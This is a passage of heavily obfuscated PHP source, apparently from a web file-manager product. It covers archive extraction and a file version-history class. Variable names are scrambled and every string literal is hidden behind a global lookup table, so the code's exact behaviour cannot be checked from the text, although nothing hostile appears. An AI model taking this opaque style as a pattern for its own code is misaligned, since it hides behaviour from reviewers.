$¯­É»‚[$˜ºÄË¯ï[1197]][count($¯­É»‚[$˜ºÄË¯ï[1197]]) - 1]; if ($„äôşå«[$˜ºÄË¯ï[1198]] == -1 || substr($„äôşå«[$˜ºÄË¯ï[32]], -1, 1) == $˜ºÄË¯ï[8]) { $Ãè™–ó• = $¯­É»‚[$˜ºÄË¯ï[1199]] . rand_string(10) . $˜ºÄË¯ï[8]; mk_dir($Ãè™–ó•); $ï™Üêš¿ = count($¯­É»‚[$˜ºÄË¯ï[1197]]) == 1 ? IO::ext($¢«×¢§) : get_path_ext($¯­É»‚[$˜ºÄË¯ï[199]]); $îáÑ Àç = KodArchive::extract(self::iconvSystem($¯­É»‚[$˜ºÄË¯ï[199]]), $Ãè™–ó•, $„äôşå«[$˜ºÄË¯ï[1198]], $ÇğÊéÊ, $ï™Üêš¿); self::unzipErrorCheck($îáÑ Àç, array($˜ºÄË¯ï[1200], $¢«×¢§, $ï™Üêš¿, $éÇàÊŒ¸, $¯­É»‚)); Hook::trigger($˜ºÄË¯ï[1201], $Ãè™–ó•); recursion_dir($Ãè™–ó•, $ÂØ¹³Ä´, $ƒæŸæ©ø, 0); $Ñí•ï’» = array_merge($ÂØ¹³Ä´, $ƒæŸæ©ø); $ƒ—ÙùÓ’ = array(); foreach ($Ñí•ï’» as $æÉ™ö˜˜) { $†´Î´øõ = IO::move(self::iconvApp($æÉ™ö˜˜), $éÇàÊŒ¸, $ûàò¦¼ù); if ($†´Î´øõ) { $ƒ—ÙùÓ’[] = $†´Î´øõ; } } del_dir($Ãè™–ó•); } else { $†´Î´øõ = IO::move($¯­É»‚[$˜ºÄË¯ï[199]], $éÇàÊŒ¸, $ûàò¦¼ù, get_path_this($„äôşå«[$˜ºÄË¯ï[32]])); if ($†´Î´øõ) { $ƒ—ÙùÓ’[] = $†´Î´øõ; } } return $ƒ—ÙùÓ’ ? $ƒ—ÙùÓ’ : !1; } public static function unzipList($å•¶¿ä‚) { $¶­¼ŞŠß =& $_SERVER[óó‹¸‚å]; $Ë®©»’ = isset($å•¶¿ä‚[$¶­¼ŞŠß[1202]]) ? $å•¶¿ä‚[$¶­¼ŞŠß[1202]] : !1; $‰¥Œğ = isset($å•¶¿ä‚[$¶­¼ŞŠß[1198]]) ? @json_decode($å•¶¿ä‚[$¶­¼ŞŠß[1198]], !0) : -1; $ú…¥µí½ = self::unzipPart($å•¶¿ä‚[$¶­¼ŞŠß[84]], $‰¥Œğ); if (!$ú…¥µí½ || !IO::exist($ú…¥µí½[$¶­¼ŞŠß[199]])) { show_json(LNG($¶­¼ŞŠß[105]), !1); } $ÄêÓıõá = $ú…¥µí½[$¶­¼ŞŠß[1197]][count($ú…¥µí½[$¶­¼ŞŠß[1197]]) - 1]; $Çñ¢± = in_array(IO::ext($ú…¥µí½[$¶­¼ŞŠß[199]]), array($¶­¼ŞŠß[313], $¶­¼ŞŠß[1203], $¶­¼ŞŠß[1204], $¶­¼ŞŠß[1205], $¶­¼ŞŠß[1206], $¶­¼ŞŠß[1207])); if (!$Ë®©»’ && ($ÄêÓıõá[$¶­¼ŞŠß[1198]] == -1 || $Çñ¢±)) { $Â‚Œî’ª = $ú…¥µí½[$¶­¼ŞŠß[1199]] . get_path_this($ú…¥µí½[$¶­¼ŞŠß[199]]) . $¶­¼ŞŠß[1208]; if (!IO::exist($Â‚Œî’ª)) { $Áé²óÈª = $ÄêÓıõá[$¶­¼ŞŠß[1198]] == -1 ? get_path_ext(IO::pathThis($å•¶¿ä‚[$¶­¼ŞŠß[84]])) : get_path_ext($ú…¥µí½[$¶­¼ŞŠß[199]]); $éÚ»îßº = KodArchive::listContent(self::iconvSystem($ú…¥µí½[$¶­¼ŞŠß[199]]), !0, $Áé²óÈª); self::unzipErrorCheck($éÚ»îßº, array($¶­¼ŞŠß[1209], $å•¶¿ä‚, $ú…¥µí½)); @file_put_contents($Â‚Œî’ª, json_encode($éÚ»îßº[$¶­¼ŞŠß[1210]])); } return @json_decode(IO::getContent($Â‚Œî’ª), !0); } IO::fileOut($ú…¥µí½[$¶­¼ŞŠß[199]], $Ë®©»’, get_path_this($ÄêÓıõá[$¶­¼ŞŠß[32]])); die; } private static function zipFileList($ûÔÀœÏ¹, $ƒ³à”ƒ° = false) { $±×ä‘Úè =& $_SERVER[óó‹¸‚å]; $ÆãùÌŠ¤ = array(); foreach ($ûÔÀœÏ¹ as $­ø‚ô) { $ŠùíŸàŸ = $­ø‚ô[$±×ä‘Úè[84]]; if ($ƒ³à”ƒ°) { $ŠùíŸàŸ = self::copy($­ø‚ô[$±×ä‘Úè[84]], $ƒ³à”ƒ°, $±×ä‘Úè[822]); } else { $Ô†÷ğİ = self::init($­ø‚ô[$±×ä‘Úè[84]]); if ($Ô†÷ğİ->getType() == $±×ä‘Úè[106]) { $ŠùíŸàŸ = $Ô†÷ğİ->path; } } if ($ŠùíŸàŸ && self::local()->exist($ŠùíŸàŸ)) { $ÆãùÌŠ¤[$­ø‚ô[$±×ä‘Úè[84]]] = $ŠùíŸàŸ; } } if (!empty($ÆãùÌŠ¤)) { return array_values($ÆãùÌŠ¤); } show_json(LNG($±×ä‘Úè[1173]), !1); } private static function localFilePath($¸«ÒÈÄ¸) { $¿§¦áĞÜ =& $_SERVER[óó‹¸‚å]; $ÄûöÎäµ = KodIO::parse($¸«ÒÈÄ¸); if ($ÄûöÎäµ[$¿§¦áĞÜ[33]] == KodIO::KOD_SOURCE) { $¹ÑÖ‚€£ = Model($¿§¦áĞÜ[829])->fileInfoGet(KodIO::sourceID($¸«ÒÈÄ¸)); if (!$¹ÑÖ‚€£[$¿§¦áĞÜ[84]]) { show_json($¿§¦áĞÜ[1211], !1); } $¸«ÒÈÄ¸ = $¹ÑÖ‚€£[$¿§¦áĞÜ[84]]; } $‰ôÌöÏĞ = self::init($¸«ÒÈÄ¸); if ($‰ôÌöÏĞ->pathParse[$¿§¦áĞÜ[1158]]) { $¸«ÒÈÄ¸ = $‰ôÌöÏĞ->pathParse[$¿§¦áĞÜ[1158]]; $‰ôÌöÏĞ = self::init($¸«ÒÈÄ¸); } $ØÂ§ßø = $‰ôÌöÏĞ->getType(); if ($ØÂ§ßø == $¿§¦áĞÜ[106] || $ØÂ§ßø == $¿§¦áĞÜ[1212]) { if (!$‰ôÌöÏĞ->exist($‰ôÌöÏĞ->path)) { show_json(LNG($¿§¦áĞÜ[105]), !1); } return $‰ôÌöÏĞ->path; } return !1; } public static function unzipPart($×°ÓŞÁƒ, $³´©™øü = -1) { $ËÌÍ¿ˆè =& $_SERVER[óó‹¸‚å]; $¯éñÖÜ = IO::pathThis($×°ÓŞÁƒ); if (!$³´©™øü || $³´©™øü == -1) { $‚Å‡¯é” = array(array($ËÌÍ¿ˆè[32] => $¯éñÖÜ, $ËÌÍ¿ˆè[1198] => -1)); $‚Å‡¯é”[0][$ËÌÍ¿ˆè[1213]] = $‚Å‡¯é”[0][$ËÌÍ¿ˆè[32]]; } else { if (is_array($³´©™øü)) { $‚Å‡¯é” = $³´©™øü; $İü“ùî¸ = count($‚Å‡¯é”) - 1; for ($ø•Ìœ¹¥ = 0; $ø•Ìœ¹¥ <= $İü“ùî¸; $ø•Ìœ¹¥++) { $õÛÇåÕŠ = $‚Å‡¯é”[$ø•Ìœ¹¥]; $¤¾ª¶Ç… = get_path_this($õÛÇåÕŠ[$ËÌÍ¿ˆè[32]]) . (checkExtSafe($õÛÇåÕŠ[$ËÌÍ¿ˆè[32]]) ? $ËÌÍ¿ˆè[12] : $ËÌÍ¿ˆè[1214]); $‚Å‡¯é”[$ø•Ìœ¹¥][$ËÌÍ¿ˆè[1213]] = $ËÌÍ¿ˆè[1215] . intval($õÛÇåÕŠ[$ËÌÍ¿ˆè[1198]]) . $ËÌÍ¿ˆè[386] . $¤¾ª¶Ç…; if ($ø•Ìœ¹¥ == 0) { continue; } $‚Å‡¯é”[$ø•Ìœ¹¥][$ËÌÍ¿ˆè[1213]] = $‚Å‡¯é”[$ø•Ìœ¹¥ - 1][$ËÌÍ¿ˆè[1213]] . $ËÌÍ¿ˆè[1216] . $‚Å‡¯é”[$ø•Ìœ¹¥][$ËÌÍ¿ˆè[1213]]; } } } if (!is_array($‚Å‡¯é”) || count($‚Å‡¯é”) == 0) { return !1; } $°€Ş¼Ãø = $‚Å‡¯é”[count($‚Å‡¯é”) - 1]; if (!IO::exist($×°ÓŞÁƒ)) { return !1; } $…¬’¡¿ = TEMP_FILES . $ËÌÍ¿ˆè[1217] . kodIO::hashPathSafe($×°ÓŞÁƒ) . $ËÌÍ¿ˆè[8]; $¯¾İ™àİ = $…¬’¡¿ . $°€Ş¼Ãø[$ËÌÍ¿ˆè[1213]]; mk_dir($…¬’¡¿); file_put_contents(TEMP_FILES . $ËÌÍ¿ˆè[1192], $ËÌÍ¿ˆè[12]); if (IO::exist($¯¾İ™àİ)) { return array($ËÌÍ¿ˆè[199] => $¯¾İ™àİ, $ËÌÍ¿ˆè[1197] => $‚Å‡¯é”, $ËÌÍ¿ˆè[1199] => $…¬’¡¿); } $ãëòŠ‚ì = self::localFilePath($×°ÓŞÁƒ); if (!$ãëòŠ‚ì) { $ãëòŠ‚ì = $…¬’¡¿ . $ËÌÍ¿ˆè[1218]; if (!IO::exist($ãëòŠ‚ì)) { self::copy($×°ÓŞÁƒ, $…¬’¡¿, !1, get_path_this($ãëòŠ‚ì)); } } if (!$ãëòŠ‚ì || !IO::exist($ãëòŠ‚ì)) { return !1; } if ($°€Ş¼Ãø[$ËÌÍ¿ˆè[1198]] == -1) { return array($ËÌÍ¿ˆè[199] => $ãëòŠ‚ì, $ËÌÍ¿ˆè[1197] => $‚Å‡¯é”, $ËÌÍ¿ˆè[1199] => $…¬’¡¿); } $şíŸìş– = $ãëòŠ‚ì; foreach ($‚Å‡¯é” as $ø•Ìœ¹¥ => $õÛÇåÕŠ) { if (!$õÛÇåÕŠ || $õÛÇåÕŠ[$ËÌÍ¿ˆè[1198]] == $ËÌÍ¿ˆè[1196]) { break; } if (substr($õÛÇåÕŠ[$ËÌÍ¿ˆè[32]], -1, 1) == $ËÌÍ¿ˆè[8]) { break; } $óáôøø = in_array(get_path_ext($õÛÇåÕŠ[$ËÌÍ¿ˆè[1213]]), array($ËÌÍ¿ˆè[313], $ËÌÍ¿ˆè[1203], $ËÌÍ¿ˆè[1204], $ËÌÍ¿ˆè[1205], $ËÌÍ¿ˆè[1206], $ËÌÍ¿ˆè[1207])); $öæ·ÃÂ = $ø•Ìœ¹¥ == count($‚Å‡¯é”) - 1 && $óáôøø; $•êÇÖ¨· = $…¬’¡¿ . $õÛÇåÕŠ[$ËÌÍ¿ˆè[1213]]; $Œ»–††… = $…¬’¡¿ . get_path_this($õÛÇåÕŠ[$ËÌÍ¿ˆè[32]]); if (IO::exist($•êÇÖ¨·)) { $şíŸìş– = $•êÇÖ¨·; continue; } $ÂÍÉ§Êê = $ø•Ìœ¹¥ == 0 ? get_path_ext($¯éñÖÜ) : get_path_ext($şíŸìş–); $”§®ëÅ = KodArchive::extract(self::iconvSystem($şíŸìş–), $…¬’¡¿, $õÛÇåÕŠ[$ËÌÍ¿ˆè[1198]], $ÖÔªâäÖ, $ÂÍÉ§Êê); self::unzipErrorCheck($”§®ëÅ, array($ËÌÍ¿ˆè[1219], $×°ÓŞÁƒ, $‚Å‡¯é”, $õÛÇåÕŠ, $•êÇÖ¨·)); if (IO::exist($Œ»–††…)) { IO::rename($Œ»–††…, get_path_this($•êÇÖ¨·)); } $şíŸìş– = $•êÇÖ¨·; } $¯¾İ™àİ = $şíŸìş–; return array($ËÌÍ¿ˆè[199] => $şíŸìş–, $ËÌÍ¿ˆè[1197] => $‚Å‡¯é”, $ËÌÍ¿ˆè[1199] => $…¬’¡¿); } private static function unzipErrorCheck($‚ìÛÛÛî, $¯ ­›‘ = false) { $¥…¼òè =& $_SERVER[óó‹¸‚å]; if ($‚ìÛÛÛî[$¥…¼òè[1220]]) { return !0; } write_log(array($¥…¼òè[1221], $‚ìÛÛÛî, $¯ ­›‘), $¥…¼òè[1222]); show_json($¥…¼òè[1223] . json_encode($‚ìÛÛÛî[$¥…¼òè[1210]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $··ğéñ =& $_SERVER[óó‹¸‚å]; $º¬®ï¶© = $GLOBALS[$··ğéñ[6]][$··ğéñ[89]]; if ($º¬®ï¶©[$··ğéñ[1224]] != 1) { return; } if ($º¬®ï¶©[$··ğéñ[1225]] <= 0) { return; } if (isset($_REQUEST[$··ğéñ[1226]]) && $_REQUEST[$··ğéñ[1226]] == $··ğéñ[88]) { return; } Hook::bind($··ğéñ[1227], $··ğéñ[1228]); Hook::bind($··ğéñ[1229], $··ğéñ[1230]); Hook::bind($··ğéñ[1231], $··ğéñ[1232]); Hook::bind($··ğéñ[1233], $··ğéñ[1234]); Hook::bind($··ğéñ[1235], $··ğéñ[1236]); Hook::bind($··ğéñ[1237], $··ğéñ[1238]); } public static function eventBeforeUpload($°Ô·“Ÿì) { if ($°Ô·“Ÿì[3] && $°Ô·“Ÿì[3] != REPEAT_REPLACE) { return; } $ÚÉêÚîª = self::parsePath($°Ô·“Ÿì[0]); if (!$ÚÉêÚîª) { return; } self::add($ÚÉêÚîª); } public static function eventBeforeEdit($¼è¯¡î) { $éæ°É = self::parsePath($¼è¯¡î[0]); if (!$éæ°É) { return; } self::add($éæ°É); } public static function eventBeforeCopyFile($š«ı¬‘Ï, $ûãì¹–ñ, $¹¥¡­Ç, $¾Ïú‰ğ, $Î±·şç, $—µ„±¥÷) { $×ô¥ı÷á =& $_SERVER[óó‹¸‚å]; if (isset($¹¥¡­Ç->_data[$×ô¥ı÷á[1162]]) && $¹¥¡­Ç->_data[$×ô¥ı÷á[1162]]) { return; } $¶œÊ­ıÂ = $¹¥¡­Ç->getPathOuter($¾Ïú‰ğ); $™£ğİŞÌ = self::parsePath($¶œÊ­ıÂ); if (!$™£ğİŞÌ) { return; } self::add($™£ğİŞÌ); } public static function eventBeforeRename($²¾£‘‡) { $½Æ£Ñ‡ã =& $_SERVER[óó‹¸‚å]; $íÙæĞŠŞ = self::parsePath($²¾£‘‡[0]); if (!$íÙæĞŠŞ) { return; } $¯†¬ØØø = self::checkInHistory($íÙæĞŠŞ); if (!$¯†¬ØØø) { return; } if ($¯†¬ØØø[$½Æ£Ñ‡ã[33]] == $½Æ£Ñ‡ã[199]) { $œÈ‚§İ = self::listData($íÙæĞŠŞ); if ($œÈ‚§İ && $œÈ‚§İ[$½Æ£Ñ‡ã[369]]) { self::moveHistory($íÙæĞŠŞ, $²¾£‘‡[1]); } } else { IO::rename($¯†¬ØØø[$½Æ£Ñ‡ã[84]], $²¾£‘‡[1]); } } public static function eventBeforeMove($äíáƒ€š) { $Ì¥û¾Š =& $_SERVER[óó‹¸‚å]; $ı¿…úÈç = self::parsePath($äíáƒ€š[0]); if (!$ı¿…úÈç) { return; } $Óä¹–ÉÁ = self::parsePath($äíáƒ€š[1]); if (!$Óä¹–ÉÁ) { return; } $˜°¡¶÷Ô = $äíáƒ€š[3]; $õ·´ğû = self::checkInHistory($ı¿…úÈç); if (!$õ·´ğû) { return; } $ÅÏ¡ğå = self::pathHistory($Óä¹–ÉÁ); if ($õ·´ğû[$Ì¥û¾Š[33]] == $Ì¥û¾Š[199]) { $õõ¼ÔÒ = self::listData($ı¿…úÈç); $Î°¥ä« = rtrim($Óä¹–ÉÁ, $Ì¥û¾Š[8]) . $Ì¥û¾Š[8] . ($˜°¡¶÷Ô ? $˜°¡¶÷Ô : get_path_this($ı¿…úÈç)); $”ï´©» = self::listData($Î°¥ä«); if ($õõ¼ÔÒ && $õõ¼ÔÒ[$Ì¥û¾Š[369]] && $”ï´©» && $”ï´©»[$Ì¥û¾Š[369]]) { return self::clear($ı¿…úÈç); } if ($õõ¼ÔÒ && $õõ¼ÔÒ[$Ì¥û¾Š[369]]) { self::moveHistory($ı¿…úÈç, $˜°¡¶÷Ô, $ÅÏ¡ğå); } } else { IO::move($õ·´ğû[$Ì¥û¾Š[84]], $ÅÏ¡ğå, !1, $˜°¡¶÷Ô); self::clearEmptyFolder(IO::pathFather($õ·´ğû[$Ì¥û¾Š[84]])); } } public static function eventAfterRemove($ÎØ¨›Òò, $şü¢ØËÜ) { $ÅÌÓ¼Ãç =& $_SERVER[óó‹¸‚å]; if (!$şü¢ØËÜ) { return; } $›éÙàì = self::parsePath($ÎØ¨›Òò[0]); if (!$›éÙàì) { return; } $ İ¶‘Ÿ” = self::checkInHistory($›éÙàì); if (!$ İ¶‘Ÿ”) { return; } if ($ İ¶‘Ÿ”[$ÅÌÓ¼Ãç[33]] == $ÅÌÓ¼Ãç[199]) { $åñÜ²¬Â = self::listData($›éÙàì, !1); if ($åñÜ²¬Â && $åñÜ²¬Â[$ÅÌÓ¼Ãç[369]]) { self::clear($›éÙàì, !1); } } else { IO::remove($ İ¶‘Ÿ”[$ÅÌÓ¼Ãç[84]]); self::clearEmptyFolder(IO::pathFather($ İ¶‘Ÿ”[$ÅÌÓ¼Ãç[84]])); } } private static function checkInHistory($¥ôášÑÚ) { $£ó†½¨ = self::pathHistory($¥ôášÑÚ); if (!IO::exist($£ó†½¨)) { $£ó†½¨ .= $_SERVER[óó‹¸‚å][1239]; } return IO::exist($£ó†½¨) ? IO::info($£ó†½¨) : !1; } private static function parsePath($Øõ˜–í¾) { $Û„£ÌÁÆ =& $_SERVER[óó‹¸‚å]; if (!$Øõ˜–í¾) { return !1; } if ($GLOBALS[$Û„£ÌÁÆ[1240]]) { return; } $ÙÈàÒ‚‘ = KodIO::parse($Øõ˜–í¾); $Û¡ù‚º¶ = $ÙÈàÒ‚‘[$Û„£ÌÁÆ[33]]; $§ë‹Ñç = !$Û¡ù‚º¶ || $Û¡ù‚º¶ == KodIO::KOD_IO || $Û¡ù‚º¶ == KodIO::KOD_SHARE_ITEM; if (!$§ë‹Ñç || !$ÙÈàÒ‚‘[$Û„£ÌÁÆ[1241]]) { return !1; } if (substr($Øõ˜–í¾, 0, strlen(DATA_PATH . $Û„£ÌÁÆ[1242])) == DATA_PATH . $Û„£ÌÁÆ[1242]) { return !1; } if ($Û¡ù‚º¶ == KodIO::KOD_SHARE_ITEM) { $‡›ÊÚ¶ = IO::init($Øõ˜–í¾); if ($‡›ÊÚ¶->pathParse[$Û„£ÌÁÆ[1158]]) { return self::parsePath($‡›ÊÚ¶->pathParse[$Û„£ÌÁÆ[1158]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¯¿˜òâĞ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Û„£ÌÁÆ[1243]); foreach ($¯¿˜òâĞ as $áŒß™¥ê) { if (!$Û¡ù‚º¶ && substr($Øõ˜–í¾, 0, strlen($áŒß™¥ê)) == $áŒß™¥ê) { return !1; } } self::log($GLOBALS[$Û„£ÌÁÆ[1153]] . $Û„£ÌÁÆ[1244] . $Øõ˜–í¾); return $Øõ˜–í¾; } private static function pathHistory($ÔÖÚ±Û®) { $Î«½ÊûŠ =& $_SERVER[óó‹¸‚å]; $Ò¿šáï‹ = self::$_historyBase . ltrim(KodIO::clear($ÔÖÚ±Û®), $Î«½ÊûŠ[8]); $Ò¿šáï‹ = str_replace(array($Î«½ÊûŠ[1245]), array($Î«½ÊûŠ[1246]), $Ò¿šáï‹); return $Ò¿šáï‹; } public static function log($¥•ÙĞã“) { } public static function historyCount($Öğ´œƒĞ) { $æ—ì¡ª =& $_SERVER[óó‹¸‚å]; $¹çãÂû = array(); $åÎÆôœ£ = array(); foreach ($Öğ´œƒĞ as $‚Ñ®óüØ) { $‹£ñª¦ø = get_path_father($‚Ñ®óüØ); if (!$åÎÆôœ£[$‹£ñª¦ø]) { $åÎÆôœ£[$‹£ñª¦ø] = array(); } $åÎÆôœ£[$‹£ñª¦ø][] = get_path_this($‚Ñ®óüØ); } foreach ($åÎÆôœ£ as $‹£ñª¦ø => $÷»«‘ê) { $Ùì”Ç = self::parsePath($‹£ñª¦ø); if (!$Ùì”Ç) { continue; } foreach ($÷»«‘ê as $­ŠÚ¤Á³) { $¡„š™µ÷ = self::listData(rtrim($Ùì”Ç, $æ—ì¡ª[8]) . $æ—ì¡ª[8] . $­ŠÚ¤Á³, !1); if ($¡„š™µ÷ && $¡„š™µ÷[$æ—ì¡ª[369]]) { $¹çãÂû[rtrim($‹£ñª¦ø, $æ—ì¡ª[8]) . $æ—ì¡ª[8] . $­ŠÚ¤Á³] = count($¡„š™µ÷[$æ—ì¡ª[369]]); } } } return $¹çãÂû; } public static function add($›£™•±¡) { $ö’´İŸ =& $_SERVER[óó‹¸‚å]; $ìöÏ°Ä× = self::listData($›£™•±¡); if (!$ìöÏ°Ä×) { return; } $Å©Õ×Èö = Model($ö’´İŸ[774])->get($ö’´İŸ[1247]); $Ã˜­äçİ = $GLOBALS[$ö’´İŸ[6]][$ö’´İŸ[89]][$ö’´İŸ[1225]]; $Ş ­ƒ‡… = $Å©Õ×Èö == $ö’´İŸ[1248] ? min(5, $Ã˜­äçİ) : $Ã˜­äçİ; if ($Ã˜­äçİ <= 0) { return; } $÷¬Ìƒ‹ = IO::info($›£™•±¡); $‘æ®ƒ…¢ = $ìöÏ°Ä×[$ö’´İŸ[369]]; if ($÷¬Ìƒ‹[$ö’´İŸ[76]] == 0) { return; } if ($÷¬Ìƒ‹[$ö’´İŸ[76]] >= 1024 * 1024 * 500) { return !1; } $ŸŸ™¿¾´ = IO::hashSimple($›£™•±¡); if ($‘æ®ƒ…¢ && $‘æ®ƒ…¢[0][$ö’´İŸ[177]] == $ŸŸ™¿¾´) { return !0; } if (array_key_exists($ö’´İŸ[202], $÷¬Ìƒ‹) && !$÷¬Ìƒ‹[$ö’´İŸ[202]]) { return !1; } $î«¶Íâ = short_id(time()); $Üôù€á˜ = array($ö’´İŸ[399] => $î«¶Íâ, $ö’´İŸ[177] => $ŸŸ™¿¾´, $ö’´İŸ[32] => $÷¬Ìƒ‹[$ö’´İŸ[32]] . $ö’´İŸ[10] . date($ö’´İŸ[1249]) . rand_string(1), $ö’´İŸ[76] => $÷¬Ìƒ‹[$ö’´İŸ[76]], $ö’´İŸ[454] => USER_ID, $ö’´İŸ[200] => time(), $ö’´İŸ[1250] => $ö’´İŸ[12]); IO::mkdir($ìöÏ°Ä×[$ö’´İŸ[1251]]); $¬¸–Í‡– = IO::copy($›£™•±¡, $ìöÏ°Ä×[$ö’´İŸ[1251]], !1, $Üôù€á˜[$ö’´İŸ[32]]); if (!$¬¸–Í‡–) { self::clearEmptyFolder($ìöÏ°Ä×[$ö’´İŸ[1251]]); return !1; } array_unshift($‘æ®ƒ…¢, $Üôù€á˜); if (count($‘æ®ƒ…¢) > $Ş ­ƒ‡…) { $¥¤ú•¥ª = array_slice($‘æ®ƒ…¢, $Ş ­ƒ‡…); foreach ($¥¤ú•¥ª as $óäÛ‚ Ğ) { IO::remove($ìöÏ°Ä×[$ö’´İŸ[1251]] . $óäÛ‚ Ğ[$ö’´İŸ[32]]); } $‘æ®ƒ…¢ = array_slice($‘æ®ƒ…¢, 0, $Ş ­ƒ‡…); } return self::saveData($ìöÏ°Ä×[$ö’´İŸ[1252]], $‘æ®ƒ…¢); } public static function remove($­éš·ëê, $÷ÒŒ±²‹) { $Îä·Ú› =& $_SERVER[óó‹¸‚å]; $¿¸œ‘ˆÄ = self::listData($­éš·ëê); $¨Õõ¶»ò = array(); if (!$¿¸œ‘ˆÄ) { return !1; } foreach ($¿¸œ‘ˆÄ[$Îä·Ú›[369]] as $Ø°§Ç“ş) { if ($Ø°§Ç“ş[$Îä·Ú›[399]] == $÷ÒŒ±²‹) { IO::remove($¿¸œ‘ˆÄ[$Îä·Ú›[1251]] . $Ø°§Ç“ş[$Îä·Ú›[32]]); continue; } $¨Õõ¶»ò[] = $Ø°§Ç“ş; } return self::saveData($¿¸œ‘ˆÄ[$Îä·Ú›[1252]], $¨Õõ¶»ò); } public static function clear($àôÉŒç, $€¨ñ†ßÛ = true) { $ÊÖô‹š =& $_SERVER[óó‹¸‚å]; $¯„¥ê… = self::listData($àôÉŒç, $€¨ñ†ßÛ); if (!$¯„¥ê…) { return !1; } foreach ($¯„¥ê…[$ÊÖô‹š[369]] as $ìïéßÎİ) { IO::remove($¯„¥ê…[$ÊÖô‹š[1251]] . $ìïéßÎİ[$ÊÖô‹š[32]]); } return self::saveData($¯„¥ê…[$ÊÖô‹š[1252]], array()); } public static function moveHistory($çº­˜, $åÑ™ìı° = '', $°ºİûº‚ = '') { $åÊ¢êáÂ =& $_SERVER[óó‹¸‚å]; $˜÷øÁşå = self::listData($çº­˜, !1); if (!$˜÷øÁşå || !$˜÷øÁşå[$åÊ¢êáÂ[369]]) { return !1; } $±¸Ó£ú = $åÊ¢êáÂ[1239]; $åÑ™ìı° = $åÑ™ìı° ? $åÑ™ìı° : get_path_this($çº­˜); $°ºİûº‚ = $°ºİûº‚ ? $°ºİûº‚ : $˜÷øÁşå[$åÊ¢êáÂ[1251]]; $ˆ©•­ˆ¥ = substr(get_path_this($˜÷øÁşå[$åÊ¢êáÂ[1252]]), 0, -strlen($±¸Ó£ú)); foreach ($˜÷øÁşå[$åÊ¢êáÂ[369]] as $Æ•ú¶€‡ => $üàŞãÈê) { $ Ë¹„Æ = $åÑ™ìı° . substr($üàŞãÈê[$åÊ¢êáÂ[32]], strlen($ˆ©•­ˆ¥)); $“Ñ¬ŸÏ÷ = IO::move($˜÷øÁşå[$åÊ¢êáÂ[1251]] . $üàŞãÈê[$åÊ¢êáÂ[32]], $°ºİûº‚, !1, $ Ë¹„Æ); if ($“Ñ¬ŸÏ÷) { $˜÷øÁşå[$åÊ¢êáÂ[369]][$Æ•ú¶€‡][$åÊ¢êáÂ[32]] = $ Ë¹„Æ; } } $˜÷øÁşå[$åÊ¢êáÂ[1252]] = IO::move($˜÷øÁşå[$åÊ¢êáÂ[1252]], $°ºİûº‚, !1, $åÑ™ìı° . $±¸Ó£ú); self::saveData($˜÷øÁşå[$åÊ¢êáÂ[1252]], $˜÷øÁşå[$åÊ¢êáÂ[369]]); self::clearEmptyFolder($˜÷øÁşå[$åÊ¢êáÂ[1251]]); } public static function rollback($ÁªØËº, $»Ñ ¹‚) { $Ğ¨êãºÙ =& $_SERVER[óó‹¸‚å]; $–÷È‹Ü = self::listData($ÁªØËº); if (!$–÷È‹Ü) { return; } $âö…²ş = IO::info($ÁªØËº); foreach ($–÷È‹Ü[$Ğ¨êãºÙ[369]] as $±œ¼ÄÊ => $ñìÂãÕ) { if ($ñìÂãÕ[$Ğ¨êãºÙ[399]] == $»Ñ ¹‚) { self::add($ÁªØËº); $Ğ‹Ê…¸£ = $–÷È‹Ü[$Ğ¨êãºÙ[1251]] . $ñìÂãÕ[$Ğ¨êãºÙ[32]]; $ø ùö¡ = IO::copy($Ğ‹Ê…¸£, IO::pathFather($ÁªØËº), REPEAT_REPLACE, $âö…²ş[$Ğ¨êãºÙ[32]]); if ($ø ùö¡) { self::remove($ÁªØËº, $»Ñ ¹‚); } return $ø ùö¡; } } return !1; } public static function setDetail($óÀøàÃ™, $®Ä ç«É, $éö’¿İ) { $Õ­«ª·ı =& $_SERVER[óó‹¸‚å]; $Á·€ÛØÛ = self::listData($óÀøàÃ™); if (!$Á·€ÛØÛ) { return; } foreach ($Á·€ÛØÛ[$Õ­«ª·ı[369]] as $œ­øäÛú => $êêóÇ§Î) { if ($êêóÇ§Î[$Õ­«ª·ı[399]] == $®Ä ç«É) { $Á·€ÛØÛ[$Õ­«ª·ı[369]][$œ­øäÛú][$Õ­«ª·ı[1250]] = $éö’¿İ; self::saveData($Á·€ÛØÛ[$Õ­«ª·ı[1252]], $Á·€ÛØÛ[$Õ­«ª·ı[369]]); return !0; } } return !1; } public static function fileInfo($ÚãÀ‰ÑŠ, $ÓƒŒ ”¥) { $Â°µÒôø =& $_SERVER[óó‹¸‚å]; $®‹„Ôâ× = self::listData($ÚãÀ‰ÑŠ); if (!$®‹„Ôâ×) { show_json(LNG($Â°µÒôø[105]), !1); } $À´äàòû = $Â°µÒôø[12]; foreach ($®‹„Ôâ×[$Â°µÒôø[369]] as $œÆÑÖóÇ => $Üéı·Æß) { if ($Üéı·Æß[$Â°µÒôø[399]] != $ÓƒŒ ”¥) { continue; } $À´äàòû = $®‹„Ôâ×[$Â°µÒôø[1251]] . $Üéı·Æß[$Â°µÒôø[32]]; break; } if (!$À´äàòû) { show_json(LNG($Â°µÒôø[105]), !1); } return IO::info($À´äàòû); } public static function fileOut($¹ï‚ŒŞÄ, $ÒİäŞßø, $ıÇ’Ş‹ = false) { $®›öÍòÕ =& $_SERVER[óó‹¸‚å]; $ÒŞ·­ç = self::fileInfo($¹ï‚ŒŞÄ, $ÒİäŞßø); $÷Şñ„í¯ =& $GLOBALS[$®›öÍòÕ[7]]; $ıÇ’Ş‹ = isset($÷Şñ„í¯[$®›öÍòÕ[1202]]) && $÷Şñ„í¯[$®›öÍòÕ[1202]] == 1; if (isset($÷Şñ„í¯[$®›öÍòÕ[33]]) && $÷Şñ„í¯[$®›öÍòÕ[33]] == $®›öÍòÕ[1253]) { return IO::fileOutImage($ÒŞ·­ç[$®›öÍòÕ[84]], $÷Şñ„í¯[$®›öÍòÕ[1254]]); } IO::fileOut($ÒŞ·­ç[$®›öÍòÕ[84]], $ıÇ’Ş‹, get_path_this($¹ï‚ŒŞÄ)); } public static function listData($íçË”‹®, $¯ğ»­€¾ = true) { $´Û§æ± =& $_SERVER[óó‹¸‚å]; if ($¯ğ»­€¾ && !IO::exist($íçË”‹®)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($íçË”‹®, 0, strlen(TEMP_PATH)) 